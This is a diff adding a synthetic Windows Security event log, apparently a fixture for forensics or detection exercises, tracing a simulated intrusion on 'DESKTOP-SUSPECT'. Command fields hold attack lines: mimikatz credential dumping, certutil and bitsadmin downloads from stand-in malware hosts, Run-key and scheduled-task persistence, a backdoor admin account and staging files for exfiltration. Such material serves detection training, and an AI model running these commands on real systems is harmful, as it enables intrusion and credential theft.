@@ -1,0 +1,653 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Events>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4625</EventID>
+    <Version>0</Version>
+    <Level>2</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:00:00.000Z"/>
+    <EventRecordID>1000</EventRecordID>
+    <Correlation ActivityID="{609a118fa0c7992eb6d6d693ec64497a}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">admin</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4625</EventID>
+    <Version>0</Version>
+    <Level>2</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:01:00.000Z"/>
+    <EventRecordID>1001</EventRecordID>
+    <Correlation ActivityID="{5b6b72b6d14a52661213c889d0029966}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">admin</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4625</EventID>
+    <Version>0</Version>
+    <Level>2</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:02:00.000Z"/>
+    <EventRecordID>1002</EventRecordID>
+    <Correlation ActivityID="{7a2e7ff26642ae0a4fc041a6a0668ca6}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">admin</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4624</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:03:00.000Z"/>
+    <EventRecordID>1003</EventRecordID>
+    <Correlation ActivityID="{16c99c035f5c05e027ef381f81f3d33c}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">admin</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4688</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:05:00.000Z"/>
+    <EventRecordID>1004</EventRecordID>
+    <Correlation ActivityID="{a93ce2ecc9861d3bfee5b8ded6d82fc1}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">cmd.exe /c whoami</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4688</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:06:00.000Z"/>
+    <EventRecordID>1005</EventRecordID>
+    <Correlation ActivityID="{7f169b12cc8e3b99f10c8304ae060c89}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">powershell.exe -enc base64_payload</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4688</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:07:00.000Z"/>
+    <EventRecordID>1006</EventRecordID>
+    <Correlation ActivityID="{90056147a24c01b9f789dc02360f37ac}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">nc.exe -l -p 4444</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4688</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:08:00.000Z"/>
+    <EventRecordID>1007</EventRecordID>
+    <Correlation ActivityID="{57443699b284107636501b7dde758f8e}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">mimikatz.exe "sekurlsa::logonpasswords"</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4688</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:10:00.000Z"/>
+    <EventRecordID>1008</EventRecordID>
+    <Correlation ActivityID="{8c25781fb5a513d07a5ca77b3b7443f8}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">certutil.exe -urlcache -f http://malware-server.net/payload.exe</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4688</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:12:00.000Z"/>
+    <EventRecordID>1009</EventRecordID>
+    <Correlation ActivityID="{50bf865c922eb382e8bb1483512e0563}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v svchost_update /t REG_SZ /d C:\Temp\malware.exe</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4688</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:14:00.000Z"/>
+    <EventRecordID>1010</EventRecordID>
+    <Correlation ActivityID="{7b8c60d9c289f923aaf2d4f4dc837ab1}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">schtasks.exe /create /tn "WindowsUpdate" /tr "C:\Temp\malware.exe" /sc minute /mo 5</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4688</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:15:00.000Z"/>
+    <EventRecordID>1011</EventRecordID>
+    <Correlation ActivityID="{90eb0c6fb598770e914f0bc8a42f3f03}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">wmic.exe process call create "cmd.exe /c ping -n 1 45.33.32.156"</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4688</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:16:00.000Z"/>
+    <EventRecordID>1012</EventRecordID>
+    <Correlation ActivityID="{5f2fcabd81dc13ef58e338b3a5482906}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">bitsadmin.exe /transfer job http://darknet-market.onion/payload C:\Temp\payload.exe</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4688</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:17:00.000Z"/>
+    <EventRecordID>1013</EventRecordID>
+    <Correlation ActivityID="{7b10a63e791cff913815a2c60313cc69}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">psexec.exe \\192.168.1.105 -s cmd.exe</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4688</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:18:00.000Z"/>
+    <EventRecordID>1014</EventRecordID>
+    <Correlation ActivityID="{08bccc600215d66b90db91bc1cc99235}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">net.exe user hacker P@ssw0rd123! /add</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4720</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:19:00.000Z"/>
+    <EventRecordID>1015</EventRecordID>
+    <Correlation ActivityID="{dbe9a58135f3192be0b99929995bec05}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">hacker account created</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4732</EventID>
+    <Version>0</Version>
+    <Level>2</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:20:00.000Z"/>
+    <EventRecordID>1016</EventRecordID>
+    <Correlation ActivityID="{6e57bd686adfa5deb13b5a8b97c9a984}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">hacker added to Administrators group</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4670</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:22:00.000Z"/>
+    <EventRecordID>1017</EventRecordID>
+    <Correlation ActivityID="{164a3473419007bc2e31dec97b6dc4b2}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">Permissions changed on C:\Windows\System32\config\SAM</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4688</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:25:00.000Z"/>
+    <EventRecordID>1018</EventRecordID>
+    <Correlation ActivityID="{24aa5ebada2d40c5dc834556012fc46d}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">tasklist.exe</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4688</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:26:00.000Z"/>
+    <EventRecordID>1019</EventRecordID>
+    <Correlation ActivityID="{86d0f2dffd07c7f1d4ae4a8240082d3d}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">net.exe user hacker /domain</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4656</EventID>
+    <Version>0</Version>
+    <Level>2</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:28:00.000Z"/>
+    <EventRecordID>1020</EventRecordID>
+    <Correlation ActivityID="{ae5939c77530129f73bd8ec474bddce5}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">Handle to SAM database requested</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4663</EventID>
+    <Version>0</Version>
+    <Level>2</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:30:00.000Z"/>
+    <EventRecordID>1021</EventRecordID>
+    <Correlation ActivityID="{b1617b5e10678ac192cecda85c8eae30}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">Attempt to access C:\Users\admin\Desktop\secrets.xlsx</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4688</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:32:00.000Z"/>
+    <EventRecordID>1022</EventRecordID>
+    <Correlation ActivityID="{035625adba641b66f5f4a7018cef2e4c}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">7z.exe a -p infected.7z C:\Users\admin\Documents</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4688</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:34:00.000Z"/>
+    <EventRecordID>1023</EventRecordID>
+    <Correlation ActivityID="{28be4d686ae54cfb780383ace55284b9}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">python3 -m http.server 8080</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
+    <EventID>4698</EventID>
+    <Version>0</Version>
+    <Level>0</Level>
+    <Task>12544</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8020000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-01T08:35:00.000Z"/>
+    <EventRecordID>1024</EventRecordID>
+    <Correlation ActivityID="{bd4afb5ed73693ee0ced1abfed73ee59}"/>
+    <Execution ProcessID="704" ThreadID="3284"/>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-SUSPECT</Computer>
+    <Security/>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">Scheduled task created: WindowsUpdate (C:\Temp\malware.exe)</Data>
+    <Data Name="SubjectUserName">DESKTOP-SUSPECT\admin</Data>
+    <Data Name="SubjectDomainName">DESKTOP-SUSPECT</Data>
+    <Data Name="LogonType">10</Data>
+    <Data Name="IpAddress">192.168.1.105</Data>
+    <Data Name="IpPort">54321</Data>
+  </EventData>
+</Event>
+</Events>
